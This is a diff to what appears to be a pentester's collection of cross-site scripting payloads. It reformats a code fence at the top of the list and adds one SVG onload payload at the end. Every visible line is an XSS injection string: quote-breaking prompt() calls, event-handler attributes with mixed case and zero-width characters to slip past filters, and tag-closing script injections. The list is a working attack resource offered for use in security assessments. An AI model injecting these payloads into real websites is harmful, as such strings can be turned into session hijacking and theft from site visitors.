@@ -5,7 +5,8 @@ I will update this with useful payloads that i found during my security assessme
 @b1tm4r
 --
 
-```"-prompt(8)-"
+```
+"-prompt(8)-"
 '-prompt(8)-'
 ";a=prompt,a()//
 ';a=prompt,a()//
@@ -2708,3 +2709,4 @@ foo<script>alert(1)</script>
 <img%20hrEF="x"%20sRC="data:x,"%20oNLy=1%20oNErrOR=prompt
 "><input autofocus a=\" onfocus​='window[al+/e/[ex+ec]e+rt](1)'>
 "></fieldset></form><​script>prompt(/legionhunter/);<​/script></body></html><!--
+<svg xmlns="http://w3.org/2000/svg" onload​="this.setAttribute('onmouseover','confirm(1)')"></svg>
